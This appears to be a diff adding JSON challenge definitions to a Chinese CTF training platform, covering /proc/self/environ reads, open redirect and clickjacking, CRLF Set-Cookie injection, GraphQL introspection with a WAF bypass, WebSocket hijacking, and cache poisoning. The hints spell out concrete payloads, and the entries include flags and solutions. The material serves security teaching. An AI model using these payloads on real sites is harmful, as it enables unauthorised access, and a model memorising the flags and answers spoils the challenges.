+   "description_html": "1. 文件读取类漏洞的过滤经常盯着\"路径穿越\"（<code ..</code ）和\"敏感文件名\"（flag/passwd）， 却忘了 绝对路径本身 就是全盘任意读。 2. Linux 的 <code /proc</code  虚拟文件系统把进程信息映射成文件：",
+   "hints": [
+    "flag 在环境变量里，不在文件里",
+    "/proc/self/ 镜像了当前进程的 environ/cmdline/fd",
+    "?file=/proc/self/environ（非 Linux 环境按页面自检给出的模拟路径）"
+   ],
+   "knowledge": [
+    {
+     "name": "/proc/self/environ",
+     "url": ""
+    },
+    {
+     "name": "环境变量泄露",
+     "url": ""
+    },
+    {
+     "name": "绝对路径未校验",
+     "url": ""
+    },
+    {
+     "name": "软链接逃逸",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "miscw1",
+   "category": "misc-web",
+   "order": 1,
+   "title": "星云活动中心 - 开放重定向 + 点击劫持(同页演示)",
+   "path": "/miscw1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{miscw1_428b3dfd}",
+   "description_html": "header('Location: ' . $ GET['url']);   // url 完全由客户端决定,无白名单",
+   "hints": [
+    "用 curl -i 看 goto.php 的响应:Location 可以是任何网站吗?试试 goto.php?url=https://www.example.com",
+    "用 curl -I 对比 vault.php 与 fixed.php 的响应头,谁缺了 X-Frame-Options?",
+    "浏览器打开 attack.php:页面上的\"领取红包\"其实是透明 iframe 里的保险箱解锁键——点一下;或直接 GET vault.php?open=1。"
+   ],
+   "knowledge": [
+    {
+     "name": "开放重定向:url 参数任意跳转,钓鱼利用",
+     "url": ""
+    },
+    {
+     "name": "点击劫持:敏感页可被 iframe 且无 X-Frame-Options",
+     "url": ""
+    },
+    {
+     "name": "X-Frame-Options / CSP frame-ancestors 修复与对照实验",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "miscw2",
+   "category": "misc-web",
+   "order": 2,
+   "title": "星云留言板 - HTTP 头注入 / CRLF(Set-Cookie 注入)",
+   "path": "/miscw2",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{miscw2_e688c64d}",
+   "description_html": "因此本题用  PHP 交互式模拟  还原漏洞：<code setname.php</code  把\"假如没有防护\"时生成的 原始 HTTP 响应报文逐字节渲染 出来（响应行 + 头 + 体，<code \\r\\n</code  以转义形式可见），并按这份报文解析出的 <code Set-Cookie</code  行记录\"本站响应真正下发过的 Cookie\"：",
+   "hints": [
+    "先访问 setname.php?name=Bob,看模拟报文里 name 出现在哪一行(Set-Cookie: visitor=...);再用 curl -i 对比真实响应头。",
+    "URL 编码的回车换行是 %0d%0a。在 name 后接 %0d%0aSet-Cookie:%20role=admin,再看模拟报文多出了哪一行。",
+    "注入成功后(同一会话,curl 记得 -b/-c 保存 Cookie)访问 admin.php —— 服务端记录过它下发过 role=admin,管理入口即开放。"
+   ],
+   "knowledge": [
+    {
+     "name": "CRLF 注入/HTTP 响应拆分(%0d%0a 折行注入任意头)",
+     "url": ""
+    },
+    {
+     "name": "Set-Cookie 注入的现实危害(会话固定/缓存投毒)",
+     "url": ""
+    },
+    {
+     "name": "头值白名单/编码的修复;框架拦截只是补救",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "adv1",
+   "category": "adv",
+   "order": 1,
+   "title": "查询语言的内省 —— GraphQL 信息泄露",
+   "path": "/adv1",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{adv1_a146e9ca}",
+   "description_html": "1.  内省（introspection） ：GraphQL 自带元查询 <code schema</code ，能列出全部类型与字段—— 生产环境未关闭时，\"没写进文档\"不等于\"不存在\"。本题隐藏字段 <code systemEnv(key: String!): String</code  返回环境变量。 2.  WAF 的文本盲区 ：WAF 只检查 <code query</code  文本中是否出现 <code flag</code  关键字； GraphQL 的 变量（variables） 走独立的 JSO",
+   "hints": [
+    "内省查询：{__schema{types{name fields{name}}}}",
+    "发现隐藏字段 systemEnv(key)；直接查 FLAG 被 WAF 拦",
+    "变量：query($k:String!){systemEnv(key:$k)} + {\"k\":\"FLAG\"}"
+   ],
+   "knowledge": [
+    {
+     "name": "GraphQL 内省",
+     "url": ""
+    },
+    {
+     "name": "隐藏字段发现",
+     "url": ""
+    },
+    {
+     "name": "variables 绕过文本 WAF",
+     "url": ""
+    },
+    {
+     "name": "unicode 转义绕过",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "adv2",
+   "category": "adv",
+   "order": 2,
+   "title": "WebSocket 的门禁 —— 跨站 WebSocket 劫持（CSWSH）",
+   "path": "/adv2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{adv2_b31c4e1b}",
+   "description_html": "WebSocket 不受浏览器同源策略约束： 任何 网页都可以向任意 <code ws://</code  地址发起连接， 且浏览器会 自动携带目标站点的 Cookie 。若服务端握手时不校验 <code Origin</code ， 攻击者的 JS 就能\"借用\"受害者的会话——本质是 WebSocket 版 CSRF。",
+   "hints": [
+    "WebSocket 不受同源策略约束，Cookie 会随握手自动发送",
+    "在页面演练区点「发起 CSWSH 攻击」：模拟受害者带管理员 Cookie、以攻击者 Origin 完成握手并执行攻击脚本",
+    "脚本保持 {\"type\":\"get_flag\"} 点攻击按钮，flag 出现在 server→victim 帧；再点修复版重放看同样的攻击被 403 拒绝"
+   ],
+   "knowledge": [
+    {
+     "name": "跨站 WebSocket 劫持",
+     "url": ""
+    },
+    {
+     "name": "Origin 校验缺失",
+     "url": ""
+    },
+    {
+     "name": "Cookie 随握手自动携带",
+     "url": ""
+    },
+    {
+     "name": "Origin 白名单修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "adv3",
+   "category": "adv",
+   "order": 3,
+   "title": "让缓存替你说谎 —— 缓存投毒 & 请求走私",
+   "path": "/adv3",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{adv3_aac55080}",
+   "description_html": "攻击链（页面三个按钮，等价于原版的 curl 三条命令）：",
+   "hints": [
+    "缓存键只有路径：不同 X-Forwarded-Host 的响应互相覆盖",
+    "依次点 ①投毒 → ②受害者访问 → ③日志：偷到的 Cookie 里 secret= 就是 flag",
+    "走私实验载入 CL.TE 样例点解析看两种切分的分歧；或修复挑战选 B（正确配置里也有 flag）"
+   ],
+   "knowledge": [
+    {
+     "name": "Web 缓存投毒",
+     "url": ""
+    },
+    {
+     "name": "未入键头 X-Forwarded-Host",
+     "url": ""
+    },
+    {
+     "name": "CL.TE/TE.CL 请求走私",
+     "url": ""
+    },
+    {
+     "name": "proxy_cache_key 修复",
+     "url": ""
+    }
+   ],
+   "bot": false
+  }
+ ]
+}
